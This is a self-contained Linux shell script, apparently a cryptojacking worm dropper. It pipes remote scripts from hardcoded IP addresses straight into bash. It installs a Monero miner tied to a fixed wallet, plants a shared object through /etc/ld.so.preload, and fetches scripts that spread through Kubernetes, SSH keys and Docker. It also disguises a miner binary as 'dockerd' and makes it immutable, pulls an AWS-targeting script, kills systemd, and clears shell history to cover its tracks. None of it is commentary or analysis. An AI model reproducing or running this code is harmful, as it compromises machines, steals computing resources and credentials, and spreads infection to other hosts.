#!/bin/sh

# wget -O - http://45.9.148.35/chimaera/sh/init.sh | sh


if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi ; fi
if ! type curl 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y curl 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null ; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y curl 2>/dev/null 1>/dev/null ; yum reinstall -y curl 2>/dev/null 1>/dev/null ; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add curl 2>/dev/null 1>/dev/null ; fi ; fi

if [ "$(whoami)" = "root" ]; then 
wget -q -O - http://45.9.148.85/LevelUp/bin/bots/TNT_AWS.sh | bash
wget -O - http://45.9.148.85/LevelUp/snitch.sh | bash
export HOME=/usr
curl -sLk https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 46EPFzvnX5GH61ejkPpNcRNm8kVjs8oHS9VwCkKRCrJX27XEW2y1NPLfSa54DGHxqnKfzDUVW1jzBfekk3hrCVCmAUrFd3H
export HOME=/root

wget http://45.9.148.35/chimaera/so/xmrig.so -O /etc/rig.so && echo "/etc/rig.so" >> /etc/ld.so.preload

wget -O - http://45.9.148.35/chimaera/sh/kube.lateral.sh | bash &
if [ -f "/root/.ssh/id_rsa" ]; then wget -O - http://45.9.148.35/chimaera/sh/spread_ssh.sh | bash ; fi
wget -O - http://45.9.148.35/chimaera/sh/spread_docker_local.sh | bash &

fi

wget -O - http://45.9.148.35/chimaera/sh/xmr.sh.sh | sh

wget -O - http://45.9.148.85/LevelUp/snitch.sh | bash || curl http://45.9.148.85/LevelUp/snitch.sh | bash
rm -f /home/ciuser/.../systemd ; pkill systemd
wget http://45.9.148.85/Ya-wer/bin/xmr/x86_64 -O /var/tmp/dockerd
chmod +x /var/tmp/dockerd
chattr +i /var/tmp/dockerd
cd /var/tmp/
./dockerd
cd /

if type aws 2>/dev/null 1>/dev/null; then wget -O - borg.wtf/aws.sh | bash & || curl borg.wtf/aws.sh | bash & ; fi
history -c   
clear




